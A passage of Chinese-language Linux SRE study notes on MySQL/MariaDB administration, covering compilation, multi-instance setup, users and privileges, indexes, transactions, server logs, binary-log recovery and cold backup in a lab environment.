    action "数据库安装完成"
}

check
install_mysql
```

**安装mysql5.7成功**

![1653217120718](linuxSRE.assets/1653217120718.png)

**安装mysql8.0成功**

![1653226873770](linuxSRE.assets/1653226873770.png)

#### 35.1.2源码编译安装

```
#1.安装相关依赖包
[root@centos7_clone1 ~]#yum -y install gcc gcc-c++ cmake bison bison-devel zlib-devel libcurl-devel libarchive-devel boost-devel   ncurses-devel gnutls-devel libxml2-devel openssl-devel libevent-devel libaio-devel perl-Data-Dumper

#2.做准备用户和数据目录
[root@centos7_clone1 ~]# useradd -r -s /sbin/nologin -d /data/mysql mysql
[root@centos7_clone1 ~]# id mysql
uid=997(mysql) gid=995(mysql) groups=995(mysql

#3.准备数据库目录
[root@centos7_clone1 ~]# mkdir /data/mysql
[root@centos7_clone1 ~]# chown mysql.mysql /data/mysql
#到mysql官网下载源码包
https://downloads.mysql.com/archives/community/

#4.源码编译安装
[root@centos7_clone1 ~]# tar xvf mysql-5.6.51.tar.gz -C /usr/local/src/
[root@centos7_clone1 ~]# cd /usr/local/src/mysql-5.6.51/
[root@centos7_clone1 mysql-5.6.51]# cmake . \
 -DCMAKE_INSTALL_PREFIX=/app/mysql \
 -DMYSQL_DATADIR=/data/mysql/ \
 -DSYSCONFDIR=/etc/ \
 -DMYSQL_USER=mysql \
 -DWITH_INNOBASE_STORAGE_ENGINE=1 \
 -DWITH_ARCHIVE_STORAGE_ENGINE=1 \
 -DWITH_BLACKHOLE_STORAGE_ENGINE=1 \
 -DWITH_PARTITION_STORAGE_ENGINE=1 \
 -DWITHOUT_MROONGA_STORAGE_ENGINE=1 \
 -DWITH_DEBUG=0 \
 -DWITH_READLINE=1 \
 -DWITH_SSL=system \
 -DWITH_ZLIB=system \
 -DWITH_LIBWRAP=0 \
 -DENABLED_LOCAL_INFILE=1 \
 -DMYSQL_UNIX_ADDR=/data/mysql/mysql.sock \
 -DDEFAULT_CHARSET=utf8 \
 -DDEFAULT_COLLATION=utf8_general_ci
VMare内存调到最大，cpu核数调到你主机能支持的最大范围
提示：如果出错，执行rm -f CMakeCache.txt
[root@centos7_clone1 mysql-5.6.51]# ll /app/mysql/   #mysql程序的路径
[root@centos7_clone1 mysql-5.6.51]# ll /data/mysql/  #存放数据库的路径

#5.准备环境变量
[root@centos7_clone1 mysql-5.6.51]# echo 'PATH=/app/mysql/bin:$PATH' > /etc/profile.d/mysql.sh
[root@centos7_clone1 mysql-5.6.51]# . /etc/profile.d/mysql.sh


#6.生成数据库文件
[root@centos7_clone1 mysql]# cd /app/mysql/
[root@centos7_clone1 mysql]# pwd
/app/mysql
[root@centos7_clone1 mysql]# scripts/mysql_install_db --datadir=/data/mysql/ --user=mysql
[root@centos7_clone1 mysql]# ll /data/mysql/ -l
total 110600
-rw-rw---- 1 mysql mysql 12582912 May 23 07:56 ibdata1
-rw-rw---- 1 mysql mysql 50331648 May 23 07:56 ib_logfile0
-rw-rw---- 1 mysql mysql 50331648 May 23 07:56 ib_logfile1
drwx------ 2 mysql mysql     4096 May 23 07:56 mysql
drwx------ 2 mysql mysql     4096 May 23 07:56 performance_schema
drwx------ 2 mysql mysql        6 May 23 07:56 test

#7.准备配置文件
[root@centos7_clone1 mysql]# cp /app/mysql/support-files/my-default.cnf  /etc/my.cnf
[root@centos7_clone1 mysql]# cp /app/mysql/support-files/mysql.server /etc/init.d/mysqld
[root@centos7_clone1 mysql]# chkconfig --add mysqld
[root@centos7_clone1 mysql]# chkconfig --list
mysqld         	0:off	1:off	2:on	3:on	4:on	5:on	6:off
netconsole     	0:off	1:off	2:off	3:off	4:off	5:off	6:off
network        	0:off	1:off	2:on	3:on	4:on	5:on	6:off

#8.准备启动脚本,并启动服务
[root@centos7_clone1 mysql]# service mysqld start

#9.安全初始化
[root@centos7_clone1 mysql]#mysql_secure_installation
```

### 35.2 实现MySQL多实例

```
#1.前提准备
#基于centos8做实验：mariadb
关闭SElinux
关闭防火墙
时间同步

#2.安装mariadb
[root@centos8 ~]# yum -y install mariadb-server


#3.准备三个实例的目录
[root@centos8 ~]# mkdir -pv /mysql/{3306,3307,3308}/{data,etc,socket,log,bin,pid}
[root@centos8 ~]# chown -R mysql.mysql /mysql
[root@centos8 ~]# ll /mysql/
total 0
drwxr-xr-x 8 mysql mysql 76 May 23 11:36 3306
drwxr-xr-x 8 mysql mysql 76 May 23 11:36 3307
drwxr-xr-x 8 mysql mysql 76 May 23 11:36 3308


#4.生成数据库文件
[root@centos8 ~]# mysql_install_db --datadir=/mysql/3306/data --user=mysql
[root@centos8 ~]# mysql_install_db --datadir=/mysql/3307/data --user=mysql
[root@centos8 ~]# mysql_install_db --datadir=/mysql/3308/data --user=mysql
#看看数据库必备文件有没有生成
[root@centos8 ~]# ls /mysql/3306/data/ -l


#5.准备配置文件
[root@centos8 ~]# vim /mysql/3306/etc/my.cnf
[mysqld]
port=3306
datadir=/mysql/3306/data
socket=/mysql/3306/socket/mysql.sock
log-error=/mysql/3306/log/mysql.log
pid-file=/mysql/3306/pid/mysql.pid
[root@centos8 ~]# sed 's/3306/3307/' /mysql/3306/etc/my.cnf > /mysql/3307/etc/my.cnf
[root@centos8 ~]# sed 's/3306/3308/' /mysql/3306/etc/my.cnf > /mysql/3308/etc/my.cnf


#6.准备启动脚本
[root@centos8 ~]# vim /mysql/3306/bin/mysqld
#!/bin/bash
port=3306
mysql_user="root"
mysql_pwd=""
cmd_path="/usr/bin"
mysql_basedir="/mysql"
mysql_sock="${mysql_basedir}/${port}/socket/mysql.sock"

function_start_mysql(){
       if [ ! -e "$mysql_sock" ];then
         printf "Starting MySQL...\n"
       ${cmd_path}/mysqld_safe --defaults-file=${mysql_basedir}/${port}/etc/my.cnf &> /dev/null &
       else
         printf "MySQL is running...\n"
         exit
      fi
}

function_stop_mysql(){
    if [ ! -e "$mysql_sock" ];then
       printf "MySQL is stopped...\n"
       exit
    else
       printf "Stoping MySQL...\n"
       ${cmd_path}/mysqladmin -u ${mysql_user} -p${mysql_pwd} -S ${mysql_sock} shutdown
    fi
}

function_restart_mysql()
{
        printf "Restarting MySQL...\n"
        function_stop_mysql
        sleep 2
        function_start_mysql
}

case $1 in
start)
   function_start_mysql
;;
stop)
  function_stop_mysql
;;
restart)
   function_restart_mysql
   ;;
*)
        printf "Usage: ${mysql_basedir}/${port}/bin/mysqld {start|stop|restart}\n"
esac

[root@centos8 ~]# chmod +x /mysql/3306/bin/mysqld
[root@centos8 ~]# sed 's/3306/3307/' /mysql/3306/bin/mysqld > /mysql/3307/bin/mysqld
[root@centos8 ~]# sed 's/3306/3308/' /mysql/3306/bin/mysqld > /mysql/3308/bin/mysqld
[root@centos8 ~]# chmod +x /mysql/3307/bin/mysqld /mysql/3308/bin/mysqld

#7.启动服务
[root@centos8 ~]# /mysql/3306/bin/mysqld start
[root@centos8 ~]# /mysql/3307/bin/mysqld start
[root@centos8 ~]# /mysql/3308/bin/mysqld start
[root@centos8 ~]#ss -ntl
#查看端口
LISTEN    0         80                       *:3306                  *:*      
LISTEN    0         80                       *:3307                  *:*      
LISTEN    0         80                       *:3308                  *:*

#8.登录实例
[root@centos8 ~]# mysql -uroot -S /mysql/3306/socket/mysql.sock
#修改密码
[root@centos8 ~]# mysqladmin -uroot -S /mysql/3306/socket/mysql.sock password '123456'
#再次登录
[root@centos8 ~]# mysql -uroot -p123456 -S /mysql/3307/socket/mysql.sock


#9.设置为开机自动启动
[root@centos8 ~]# vim /etc/rc.d/rc.local
for i in {3306..3308};do /mysql/$i/bin/mysqld start;done
[root@centos8 ~]# chmod +x /etc/rc.d/rc.local
#发现启动失败，第一反应看日记
[root@centos8 ~]# cat /mysql/3306/log/mysql.log
```

### 35.3MySQL用户管理

```
#centos8
MariaDB [hellodb]> create user liu@'10.0.0.%';
此时允许10网段的主机连接，密码为空
MariaDB [hellodb]> select user,host,password from mysql.user；
+------+-----------+----------+
| user | host      | password |
+------+-----------+----------+
| root | localhost |          |
| root | centos8   |          |
| root | 127.0.0.1 |          |
| root | ::1       |          |
|      | localhost |          |
|      | centos8   |          |
| liu  | 10.0.0.%  |          |
+------+-----------+----------+
7 rows in set (0.000 sec)
#修改登录密码
MariaDB [hellodb]> alter user liu@'10.0.0.%' identified by '123456';
#更改密码
MariaDB [hellodb]> update mysql.user set password=password('123456') where user='root';

#centos7
[10:09:02 root@centos7 ~]#mysql -uliu -h10.0.0.8 #远程登录
[10:43:53 root@centos7 ~]#mysql -uliu -h10.0.0.8 -p123456 #修改密码后重新登录


#破解root密码
[root@centos8 ~]# vim /etc/my.cnf
加上下面俩行
[mysqld]
skip-grant-tables
skip-networking #安全保护机制
[root@centos8 ~]# systemctl restart mariadb
[root@centos8 ~]#mysql #直接mysql连
MariaDB [(none)]> flush privileges; #刷新
MariaDB [(none)]> alter user root@'localhost' identified by 'ubuntu';#修改密码
```

### 35.4MySQL权限管理

```
权限类别：
管理类
程序类
数据库级别
表级别
字段级别

管理类：
CREATE USER
FILE
SUPER
SHOW DATABASES
RELOAD
SHUTDOWN
REPLICATION SLAVE
REPLICATION CLIENT
LOCK TABLES
PROCESS
CREATE TEMPORARY TABLES

程序类：针对 FUNCTION、PROCEDURE、TRIGGER
CREATE
ALTER
DROP
EXCUTE

库和表级别：针对 DATABASE、TABLE
ALTER
CREATE
CREATE VIEW
DROP INDEX
SHOW VIEW
WITH GRANT OPTION：能将自己获得的权限转赠给其他用户

数据操作
SELECT
INSERT
DELETE
UPDATE

字段级别
SELECT(col1,col2,...)
UPDATE(col1,col2,...)
INSERT(col1,col2,...)

所有权限
ALL PRIVILEGES 或 ALL

#1.授予权限
创建修改，删除表的权限
grant create on testdb.* to developer@'192.168.0.%';
grant alter on testdb.* to developer@'192.168.0.%';
grant drop on testdb.* to developer@'192.168.0.%';
外键操作权限
grant references on testdb.* to developer@'192.168.0.%';
临时表权限
grant create temporary tables on testdb.* to developer@'192.168.0.%';
索引权限
grant index on testdb.* to developer@'192.168.0.%';

MariaDB [hellodb]> create user liu@'10.0.0.%' identified by '123456';
MariaDB [hellodb]> grant all on hellodb.* to liu@'10.0.0.%'; #允许liu账号管理hellodb下的所有内容
MariaDB [hellodb]> grant all on hellodb.* to liu@'10.0.0.%' WITH GRANT OPTION #权限传递
MariaDB [hellodb]> show grants for liu@'10.0.0.%'; #查看权限
MariaDB [hellodb]> grant all on *.* to root@'10.0.0.%' identified by '123456' WITH GRANT OPTION; #等于一个管理员账户，可以远程登录，还可以把权限交给第三方
MariaDB [hellodb]> select user,host,password from mysql.user;
+-------+-----------+-------------------------------------------+
| user  | host      | password                                  |
+-------+-----------+-------------------------------------------+
| root  | localhost | *3CD53EE62F8F7439157DF288B55772A2CA36E60C |
| root  | centos8   | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
| root  | 127.0.0.1 | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
| root  | ::1       | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
|       | localhost |                                           |
|       | centos8   |                                           |
| liu   | 10.0.0.%  | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
| heman | 10.0.0.%  | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
| root  | 10.0.0.%  | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
+-------+-----------+-------------------------------------------+
9 rows in set (0.000 sec)


#centos7远程登录
[13:12:48 root@centos7 ~]#mysql -h10.0.0.8 -uroot -p123456


#2.取消权限
MariaDB [hellodb]> REVOKE DELETE ON *.* FROM 'testuser'@'10.0.0.%';
```

![1653369955501](linuxSRE.assets/1653369955501.png)

### 35.5Index索引

```
#1.创建索引
MariaDB [hellodb]> create index idx_name on student(name);
#查看搜索的时候是否利用到索引
MariaDB [hellodb]> explain select *from student where name ='lujunhao';

#2.删除索引
MariaDB [hellodb]> drop index idx_name on student;

#3.查看索引
MariaDB [hellodb]> show index from student;
#更精确的查看命令的执行结果
MariaDB [hellodb]> set profiling = ON；
MariaDB [hellodb]> show profiles;
+----------+------------+----------------------+
| Query_ID | Duration   | Query                |
+----------+------------+----------------------+
|        1 | 0.00024347 | select *from student |
+----------+------------+----------------------+
1 row in set (0.000 sec)
MariaDB [hellodb]> show profile for query 1;
#查看执行一条命令的每个阶段花的时间
+------------------------+----------+
| Status                 | Duration |
+------------------------+----------+
| Starting               | 0.000038 |
| Checking permissions   | 0.000005 |
| Opening tables         | 0.000015 |
| After opening tables   | 0.000003 |
| System lock            | 0.000003 |
| Table lock             | 0.000004 |
| Init                   | 0.000013 |
| Optimizing             | 0.000007 |
| Statistics             | 0.000009 |
| Preparing              | 0.000010 |
| Executing              | 0.000002 |
| Sending data           | 0.000088 |
| End of update loop     | 0.000008 |
| Query end              | 0.000002 |
| Commit                 | 0.000004 |
| Closing tables         | 0.000003 |
| Unlocking tables       | 0.000002 |
| Closing tables         | 0.000007 |
| Starting cleanup       | 0.000002 |
| Freeing items          | 0.000004 |
| Updating status        | 0.000012 |
| Reset for next command | 0.000002 |
+------------------------+----------+
22 rows in set (0.000 sec)
```

### 35.6MySQL锁管理和事务

```
#1.显式使用锁
加锁：
MariaDB [hellodb]> lock tables student read; #加读锁
MariaDB [hellodb]> update student set age=88 where id=2;
ERROR 1099 (HY000): Table 'student' was locked with a READ lock and can't be updated
#整个服务器加锁
MariaDB [hellodb]> flush tables with read lock;

#解锁
MariaDB [hellodb]> UNLOCK TABLES;

#2.管理事务
显式启动事务：
BEGIN
BEGIN WORK
START TRANSACTION

结束事务：
#提交
COMMIT
#回滚
ROLLBACK

自动提交：
MariaDB [hellodb]> set autocommit=0;
Query OK, 0 rows affected (0.000 sec)

MariaDB [hellodb]> select @@autocommit;
+--------------+
| @@autocommit |
+--------------+
|            0 |
+--------------+
1 row in set (0.000 sec)
MariaDB [hellodb]> delete from student;
MariaDB [hellodb]> rollback;可以后悔

#3.事务隔离级别
READ UNCOMMITTED 
可读取到未提交数据，产生脏读
READ COMMITTED
可读取到提交数据，但未提交数据不可读，产生不可重复读，即可读取到多个提交数据，导致每次读取数据不一致
REPEATABLE READ 
可重复读，多次读取数据都一致，产生幻读，即读取过程中，即使有其它提交的事务修改数据，仍只能读取到未修改前的旧数据。此为MySQL默认设置
MariaDB [(none)]> select @@tx_isolation;
+-----------------+
| @@tx_isolation  |
+-----------------+
| REPEATABLE-READ |
+-----------------+
1 row in set (0.000 sec)
SERIALIZABLE
可串行化，未提交的读事务阻塞修改事务（加读锁，但不阻塞读事务），或者未提交的修改事务阻
塞读事务（加写锁，其它事务的读，写都不可以执行）。会导致并发性能差

#修改mysql中的隔离级别
#方法一：
[root@centos8 ~]# vim /etc/my.cnf.d/mariadb-server.cnf
找到[mysqld]下面添加你指定的隔离级别
transaction-isolation="READ UNCOMMITTED"
[root@centos8 ~]# systemctl restart mariadb

#方法二：
直接mariadb里面直接指定
SET tx_isolation='READ-UNCOMMITTED|READ-COMMITTED|REPEATABLE-READ|SERIALIZABLE'



MVCC和事务的隔离级别：
MVCC（多版本并发控制机制）只在REPEATABLE READ和READ COMMITTED两个隔离级别下工作。其
他两个隔离级别都和MVCC不兼容,因为READ UNCOMMITTED总是读取最新的数据行，而不是符合当前
事务版本的数据行。而SERIALIZABLE则会对所有读取的行都加锁
```

![1653406182755](linuxSRE.assets/1653406182755.png)

### 35.7MySQL日志管理

#### 35.7.1事务日志

```
#1.事务日志
事务日志：transaction log
redo log：实现 WAL（Write Ahead Log) ,数据更新前先记录
undo log：保存与执行的操作相反的操作,用于实现rollback

Innodb事务日志相关配置：
MariaDB [(none)]> show variables like '%innodb_log%';
+-----------------------------+----------+
| Variable_name               | Value    |
+-----------------------------+----------+
| innodb_log_buffer_size      | 16777216 |
| innodb_log_checksums        | ON       |
| innodb_log_compressed_pages | ON       |
| innodb_log_file_size        | 50331648 |
| innodb_log_files_in_group   | 2        |
| innodb_log_group_home_dir   | ./       |
| innodb_log_optimize_ddl     | ON       |
| innodb_log_write_ahead_size | 8192     |
+-----------------------------+----------+
8 rows in set (0.001 sec)

#1.1事务日志性能优化:
innodb_flush_log_at_trx_commit=0|1|2

1 此为默认值，日志缓冲区将写入日志文件，并在每次事务后执行刷新到磁盘。 这是完全遵守ACID特性
0 提交时没有写磁盘的操作; 而是每秒执行一次将日志缓冲区的提交的事务写入刷新到磁盘。 这样可提供更好的性能，但服务器崩溃可能丢失最后一秒的事务
2 每次提交后都会写入OS的缓冲区，但每秒才会进行一次刷新到磁盘文件中。 性能比0略差一些，但操作系统或停电可能导致最后一秒的交易丢失

MariaDB [(none)]> set global innodb_flush_log_at_trx_commit=2; #性能可大幅度提升，但安全性会稍弱
```

#### 35.7.2错误日志

```
#2错误日志
mysqld启动和关闭过程中输出的事件信息
mysqld运行中产生的错误信息
event scheduler运行一个event时产生的日志信息
在主从复制架构中的从服务器上启动从服务器线程时产生的信息

错误文件路径
SHOW GLOBAL VARIABLES LIKE 'log_error' ;

#2.1查看错误日记
[root@centos8 ~]# vim /etc/my.cnf.d/mariadb-server.cnf #在这个文件里定义错误日记的路径
[root@centos8 ~]# tail /var/log/mariadb/mariadb.log
```

#### 35.7.3通用日志

```
#3.通用日志
通用日志：记录对数据库的通用操作，包括:错误的SQL语句
通用日志可以保存在：file（默认值）或 table（mysql.general_log表）

#3.1通用日志相关设置
general_log=ON|OFF #开启关闭通用日志
general_log_file=HOSTNAME.log 
log_output=TABLE|FILE|NONE #存放到内存|文件

#3.2开启通用日志
MariaDB [(none)]> select @@general_log;
+---------------+
| @@general_log |
+---------------+
|             0 |
+---------------+
1 row in set (0.000 sec)
MariaDB [(none)]> show  variables like 'general_log';
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| general_log   | OFF   |
+---------------+-------+
1 row in set (0.003 sec)
MariaDB [(none)]> set global general_log=1;
Query OK, 0 rows affected (0.004 sec)
MariaDB [(none)]> show  variables like 'general_log';
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| general_log   | ON    |
+---------------+-------+
1 row in set (0.001 sec)
MariaDB [(none)]> select * from student;


#打开另外一个进程，查看通用日志
只要把set global general_log=1打开，就会生成centos8.log的通用日志文件，你执行什么操作都会在日志里面看见
[root@centos8 ~]# cd /data/mysql/
[root@centos8 mysql]# tail -f centos8.log
2022-05-25T05:07:32.117041Z	    3 Query	SELECT DATABASE()
2022-05-25T05:07:32.117170Z	    3 Init DB	hellodb
2022-05-25T05:07:32.118169Z	    3 Query	show databases
2022-05-25T05:07:32.118479Z	    3 Query	show tables
2022-05-25T05:07:45.096564Z	    3 Query	CREATE TABLE student (
id int UNSIGNED AUTO_INCREMENT PRIMARY KEY,
name VARCHAR(20) NOT NULL,
age tinyint UNSIGNED,
gender ENUM('M','F') default 'M'
)ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8
2022-05-25T05:09:29.701916Z	    3 Query	insert student (name,age)values('xiaoming',20)
2022-05-25T05:12:32.336925Z	    3 Query	select * from student

#存放到数据库中
mysql> show variables like 'log_output';
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| log_output    | FILE  |
+---------------+-------+
1 row in set (0.00 sec)
mysql> set global log_output='table';
Query OK, 0 rows affected (0.00 sec)

mysql> show variables like 'log_output';
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| log_output    | TABLE |
+---------------+-------+
1 row in set (0.00 sec)
现在日志已经不在centos8.log中显示了，已经存放到数据里面了
mysql> select *from general_log;
#也可以在配置文件里面查看日记
[root@centos8 mysql]# tail -f /data/mysql/mysql/general_log.CSV

#范例:查找执行次数最多的前三条语句
mysql> select argument,count(argument) from general_log group by argument order by count(argument) desc limit 3;
+---------------------------+-----------------+
| argument                 | count(argument) |
+---------------------------+-----------------+
| select * from teachers   |               6 |
| select * from general_log|               4 |
| select * from students   |               3 |
+---------------------------+-----------------+
3 rows in set (0.002 sec)

#范例:对访问的语句进行排序
[root@centos8 ~]#mysql -e 'select argument from mysql.general_log' | awk '{sql[$0]++}END{for(i in sql){print sql[i],i}}'|sort -nr
[root@centos8 ~]#mysql -e 'select argument from mysql.general_log' |sort |uniq -c |sort -nr
```

#### 35.7.4慢查询日志

```
#慢查询日志
慢查询日志：记录执行查询时长超出指定时长的操作

慢查询相关变量
slow_query_log=ON|OFF #开启或关闭慢查询，支持全局和会话，只有全局设置才会生成慢查询文件
long_query_time=N #慢查询的阀值，单位秒,默认为10s
slow_query_log_file=HOSTNAME-slow.log  #慢查询日志文件
log_slow_filter = admin,filesort,filesort_on_disk,full_join,full_scan,
query_cache,query_cache_miss,tmp_table,tmp_table_on_disk 
#上述查询类型且查询时长超过long_query_time，则记录日志
log_queries_not_using_indexes=ON  #工作中推荐使用,即使没达到阈值也会记录到慢查询中
句是否记录日志，默认OFF，即不记录
log_slow_rate_limit = 1 #多少次查询才记录，mariadb特有
log_slow_verbosity= Query_plan,explain #记录内容
log_slow_queries = OFF    #同slow_query_log，MariaDB 10.0/MySQL 5.6.1 版后已删除

mysql> select @@slow_query_log; #慢查询默认没开启
+------------------+
| @@slow_query_log |
+------------------+
|                0 |
+------------------+
1 row in set (0.00 sec)

mysql> select @@long_query_time; #慢查询默认10s
+-------------------+
| @@long_query_time |
+-------------------+
|         10.000000 |
+-------------------+
1 row in set (0.00 sec)
mysql> set global slow_query_log=1;
mysql> select @@slow_query_log;
+------------------+
| @@slow_query_log |
+------------------+
|                1 |
+------------------+
1 row in set (0.00 sec)
在/data/mysql下会生成一个centos8-slow.log的文件

#查看慢查询的日志
[root@centos8 mysql]# tail -f /data/mysql/centos8-slow.log

#慢查询分析工具mysqldumpslow
[root@centos8 ~]#mysqldumpslow --help
Usage: mysqldumpslow [ OPTS... ] [ LOGS... ]
Parse and summarize the MySQL slow query log. Options are
  --verbose   verbose
  --debug     debug
  --help       write this text to standard output
  -v           verbose
  -d           debug
  -s ORDER     what to sort by (aa, ae, al, ar, at, a, c, e, l, r, t), 'at' is 
default
               aa: average rows affected
               ae: aggregated rows examined
               al: average lock time
               ar: average rows sent
               at: average query time
                 a: rows affected
                 c: count
                 e: rows examined 
                 l: lock time
                 r: rows sent
                 t: query time  
  -r           reverse the sort order (largest last instead of first)
  -t NUM       just show the top n queries
  -a           don't abstract all numbers to N and strings to 'S'
  -n NUM       abstract numbers with at least n digits within names
  -g PATTERN   grep: only consider stmts that include this string
  -h HOSTNAME hostname of db server for *-slow.log filename (can be wildcard),
               default is '*', i.e. match all
  -i NAME     name of server instance (if using mysql.server startup script)
  -l           don't subtract lock time from total time
  
[root@centos8 ~]#mysqldumpslow -s c -t 2 /var/lib/mysql/centos8-slow.log 
Reading mysql slow query log from /var/lib/mysql/centos8-slow.log
Count: 1  Time=0.00s (0s)  Lock=0.00s (0s)  Rows_sent=2.0 (2), 
Rows_examined=25.0 (25), Rows_affected=0.0 (0), root[root]@localhost
 select * from students where age=N
```

#### 35.7.5二进制日志

```
#5.二进制日志(备份)
记录导致数据改变或潜在导致数据改变的SQL语句
记录已提交的日志
不依赖于存储引擎类型

#5.1二进制日志文件的构成
有两类文件
1.日志文件：mysql|mariadb-bin.文件名后缀，二进制格式,如： on.000001,mariadb-bin.000002
2.索引文件：mysql|mariadb-bin.index，文本格式,记录当前已有的二进制日志文件列表


#5.2二进制日志相关的服务器变量
sql_log_bin=ON|OFF：#是否记录二进制日志，默认ON，支持动态修改，系统变量，而非服务器选项
log_bin=/PATH/BIN_LOG_FILE：#指定文件位置；默认OFF，表示不启用二进制日志功能，上述两项都开
启才可以
binlog_format=STATEMENT|ROW|MIXED：#二进制日志记录的格式，默认STATEMENT，STATEMENT数据不全，在不同的时间执行的结果不同，在二进制日志中只记录一条sql语句，ROW数据全，在不同的时间执行的结果相同，在二进制日志中只记录多条sql语句
max_binlog_size=1073741824：#单个二进制日志文件的最大体积，到达最大值会自动滚动，默认为1G
#说明：文件达到上限时的大小未必为指定的精确值
binlog_cache_size=4m #此变量确定在每次事务中保存二进制日志更改记录的缓存的大小（每次连接）
max_binlog_cache_size=512m #限制用于缓存多事务查询的字节大小。
sync_binlog=1|0：#设定是否启动二进制日志即时同步磁盘功能，默认0，由操作系统负责同步日志到磁盘
expire_logs_days=N：#二进制日志可以自动删除的天数。 默认为0，即不自动删除


#5.2开启mariadb的log_bin
#注意：只有centos8才有mariadb-server.cnf文件
如果centos7想要拥有，必须要复制centos8的mariadb-server.cnf文件
[root@centos7 ~]# vim /etc/my.cnf.d/mariadb-server.cnf
[mysqld]
log-bin=/data/logbin/mysql-bin

[root@centos7 ~]# mkdir /data/logbin/ -pv
mkdir: created directory '/data/logbin/'
[root@centos7 ~]# chown mysql.mysql /data/logbin
[root@centos7 ~]# systemctl restart mariadb

#把ROW型变成STATEMENT型
[root@centos7 ~]# vim /etc/my.cnf.d/mariadb-server.cnf
[mysqld]
binlog_format=statement
[root@centos7 ~]# systemctl restart mariadb
Current database: hellodb
+-----------------+
| @@binlog_format |
+-----------------+
| STATEMENT       |
+-----------------+
1 row in set (0.004 sec)


#查看mariadb自行管理使用中的二进制日志文件列表，及大小
SHOW {BINARY | MASTER} LOGS
#查看使用中的二进制日志文件
mysql> show master logs;
+--------------------+-----------+
| Log_name           | File_size |
+--------------------+-----------+
| centos8-bin.000001 |       177 |
| centos8-bin.000002 |  39280199 |
+--------------------+-----------+
2 rows in set (0.00 sec)
[root@centos8 ~]# systemctl restart mysqld
如果重启会生成新的二进制文件
mysql> show master logs;
+--------------------+-----------+
| Log_name           | File_size |
+--------------------+-----------+
| centos8-bin.000001 |       177 |
| centos8-bin.000002 |  39280222 |
| centos8-bin.000003 |       154 |
+--------------------+-----------+
3 rows in set (0.00 sec)
#查看目前正在使用中的二进制日志文件
SHOW MASTER STATUS
#在线查看二进制文件中的指定内容
mysql> show binlog events in 'centos8-bin.000003';
[root@centos8 mysql]# mysqlbinlog 
#离线查看二进制日志
/data/mysql/centos8-bin.000003 --start-position=154 --stop-position=437
#清除指定二进制日志
MariaDB [hellodb]> purge binary logs to 'mysql-bin.000003';
#删除mariadb-bin.000003之前的日志
Query OK, 0 rows affected (0.002 sec)
MariaDB [hellodb]> show master logs;
+------------------+-----------+
| Log_name         | File_size |
+------------------+-----------+
| mysql-bin.000003 |       328 |
+------------------+-----------+
1 row in set (0.000 sec)
PURGE BINARY LOGS BEFORE '2017-01-23';
PURGE BINARY LOGS BEFORE '2017-03-22 09:25:30';
#删除所有二进制日志，index文件重新记数
MariaDB [hellodb]> RESET MASTER 
MariaDB [hellodb]> show master logs;
+------------------+-----------+
| Log_name         | File_size |
+------------------+-----------+
| mysql-bin.000001 |       328 |
+------------------+-----------+
#切换日志文件
MariaDB [hellodb]> flush logs; #生成一个新的二进制文件，并后续的日志写入新的二进制文件中
#二进制日志进行误删还原
MariaDB [hellodb]> delete from teachers where tid >=4;
[root@centos8 ~]# mysqlbinlog /data/logbin/mysql-bin.000003 -v
#把之前执行删除操作的二进制日记截取掉，保留原来的日志并导出，则可以进行恢复操作
[root@centos8 ~]# mysqlbinlog /data/logbin/mysql-bin.000003 --stop-position=599 > /root/binlog.sql
[root@centos8 ~]# mysql hellodb < /root/binlog.sql
```

### 35.8MySQL备份和恢复

#### 35.8.1备份恢复概述

```
#1.备份的类型：
冷、温、热备份
冷备：读、写操作均不可进行，数据库停止服务
温备：读操作可执行；但写操作不可执行
热备：读、写操作均可执行
 MyISAM：温备，不支持热备
 InnoDB：都支持
 
#物理和逻辑备份
物理备份：直接复制数据文件进行备份，与存储引擎有关，占用较多的空间，速度快
逻辑备份：从数据库中“导出”数据另存而进行的备份，与存储引擎无关，占用空间少，速度慢，可能丢失精度


#1.2备份注意要点
能容忍最多丢失多少数据
备份产生的负载
备份过程的时长
温备的持锁多久
恢复数据需要在多长时间内完成
需要备份和恢复哪些数据


#1.3备份工具
cp, tar等复制归档工具：物理备份工具，适用所有存储引擎；只支持冷备；完全和部分备份
mysqldump：逻辑备份工具，适用所有存储引擎，对MyISAM存储引擎进行温备；支持完全或部(主流,用的多)
分备份；对InnoDB存储引擎支持热备，结合binlog的增量备份
xtrabackup：由Percona提供支持对InnoDB做热备(物理备份)的工具，支持完全备份、增量备份
```

#### 35.8.2冷备份和还原

```
#1.冷备份mysql 8.0.17
#源主机10.0.0.8
#安装了mysql的8.0.17的主机
#注意备份的主机要和源主机数据库版本号一致
[root@centos8 ~]# yum -y install mysql-server
[root@centos8 ~]# mysql < hellodb_innodb.sql #导入数据库文件
[root@centos8 ~]#mysql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| hellodb            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)
[root@centos8 ~]# systemctl stop mysqld
[root@centos8 ~]# rsync -a /var/lib/mysql 10.0.0.152:/data/  #10.0.0.152是要备份的主机

#目标主机10.0.0.152
#安装不启动，即冷备份
[root@centos8_1~]# ls /var/lib/mysql #里面什么内容都没有
[root@centos8_1:~]# cp -a /data/mysql/* /var/lib/mysql/
[root@centos8_1:~]# systemctl enable --now mysqld
#如果发生问题
[root@centos8_1:~]# ll /var/log/mysql/mysqld.log
root@centos8_1:~# mysql #登录看之前的文件备份成功了没
mysql> show databases;
源文件成功备份
+--------------------+
| Database           |
+--------------------+
| hellodb            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)



#2.冷备份mariadb10.3
#在目标服务器（10.0.0.18）安装mariadb-server，不启动服务
[root@centos8 ~]#dnf install mariadb-server
#在源主机（10.0.0.8）执行
[root@centos8 ~]# systemctl stop mariadb
#复制相关文件并保留属性：可以用 rsync
[root@centos8 ~]#rsync -av /etc/my.cnf.d/mariadb-server.cnf 10.0.0.18:/etc/my.cnf.d/
